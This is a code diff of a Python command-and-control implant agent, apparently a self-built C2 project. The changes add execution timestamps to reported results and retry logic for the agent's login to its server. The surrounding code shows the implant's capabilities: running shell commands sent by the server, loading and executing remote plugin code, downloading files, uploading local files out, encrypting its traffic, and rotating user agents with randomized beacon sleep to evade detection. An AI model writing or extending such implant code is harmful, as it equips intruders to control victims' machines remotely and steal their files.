@@ -11,6 +11,7 @@ import platform
 from cryptography.fernet import Fernet
 import importlib.util
 from multiprocessing import Process
+from datetime import datetime
 
 
 SERVER_URL = "http://localhost:5000"
@@ -157,7 +158,8 @@ def execute_task(task, task_uuid):
         SLEEP_MAX = task.get("max", SLEEP_MAX)
 
         print(f"[+] Sleep changed to {SLEEP_MIN}-{SLEEP_MAX} seconds")
-        post_result(f"[+] Sleep changed to {SLEEP_MIN}-{SLEEP_MAX} seconds",task_uuid)
+        executed_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        post_result(f"[+] Sleep changed to {SLEEP_MIN}-{SLEEP_MAX} seconds",task_uuid,executed_at)
 
 
 def execute_shell(command, task_uuid):
@@ -175,12 +177,13 @@ def execute_shell(command, task_uuid):
         output = result.decode()
 
         print(output)
+        executed_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-        post_result(output, task_uuid)
+        post_result(output, task_uuid,executed_at)
 
     except subprocess.CalledProcessError as e:
-
-        post_result("[!] Error: "+e.output.decode(), task_uuid)
+        executed_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        post_result("[!] Error: "+e.output.decode(), task_uuid,executed_at)
 
 
 # 1. Move the inner function to the top level
@@ -196,15 +199,18 @@ def execute_plugin(content, module_name, task_uuid):
 
         if hasattr(module, "run"):
             module.run()
+            executed_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             print(f"[+] Plugin '{module_name}' executed successfully")
-            post_result(f"[+] Plugin '{module_name}' executed", task_uuid)
+            post_result(f"[+] Plugin '{module_name}' executed", task_uuid,executed_at)
         else:
             print(f"[!] Plugin '{module_name}' has no run() function")
-            post_result(f"[!] Error: Plugin '{module_name}' has no run() function", task_uuid)
+            executed_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            post_result(f"[!] Error: Plugin '{module_name}' has no run() function", task_uuid,executed_at)
 
     except Exception as e:
         print(f"[!] Plugin '{module_name}' crashed: {e}")
-        post_result(f"[!] Error: Plugin '{module_name}' crashed: {e}", task_uuid)
+        executed_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        post_result(f"[!] Error: Plugin '{module_name}' crashed: {e}", task_uuid,executed_at)
 
 def download_file(url, save_as=None, task_uuid=None):
     try:
@@ -228,18 +234,21 @@ def download_file(url, save_as=None, task_uuid=None):
                 print(f"[!] Plugin '{module_name}' timed out, terminating...")
                 p.terminate()
                 p.join()
-                post_result(f"[!] Error: Plugin '{module_name}' aborted due to timeout", task_uuid)
+                executed_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                post_result(f"[!] Error: Plugin '{module_name}' aborted due to timeout", task_uuid,executed_at)
         else:
             if save_as is None:
                 save_as = url.split("/")[-1]
             with open(save_as, "wb") as f:
                 f.write(r.content)
-            post_result(f"Downloaded file {save_as}", task_uuid)
+            executed_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            post_result(f"Downloaded file {save_as}", task_uuid,executed_at)
 
     except Exception as e:
         print(f"[!] Error: download failed {url}: {e}")
         if task_uuid:
-            post_result(f"[!] Error: {e}", task_uuid)
+            executed_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            post_result(f"[!] Error: {e}", task_uuid,executed_at)
 
 
 def upload_file(path_to_file, task_uuid):
@@ -259,26 +268,27 @@ def upload_file(path_to_file, task_uuid):
                 files=files,
                 data=data
             )
-
+        executed_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         post_result(
             f"[+] Uploaded {path_to_file} ({response.status_code})",
-            task_uuid
+            task_uuid,executed_at
         )
 
     except Exception as e:
 
         print(f"[!] Upload error: {e}")
+        executed_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        post_result(f"[!] Error: Failed to upload : {e}", task_uuid,executed_at)
 
-        post_result(f"[!] Error: Failed to upload : {e}", task_uuid)
 
-
-def post_result(result, task_uuid):
+def post_result(result, task_uuid,executed_at=None):
     headers = {"USER-AGENT": random.choice(USER_AGENTS), "TOKEN": TOKEN}
 
     payload = {
         "id": AGENT_ID,
         "output": result,
-        "uuid": task_uuid
+        "uuid": task_uuid,
+        "executed_at":executed_at
     }
 
     encrypted_payload = encrypt_data(json.dumps(payload))
@@ -297,12 +307,20 @@ def post_result(result, task_uuid):
 
 
 def main():
-    if not login():
-        print("[!] Agent login failed")
+    attempts = 0
+    while attempts < 5:
+        if login():
+            print("[+] Agent authenticated")
+            break
+        else:
+            attempts += 1
+            print(f"[!] Agent login failed (attempt {attempts}/{5})")
+            time.sleep(3)  # wait a bit before retrying
+    else:
+        print("[!] Max login attempts reached. Exiting...")
         return
 
-    print("[+] Agent authenticated")
-
+    # Main loop after successful login
     while True:
         beacon()
         sleep_time = random.randint(SLEEP_MIN, SLEEP_MAX)
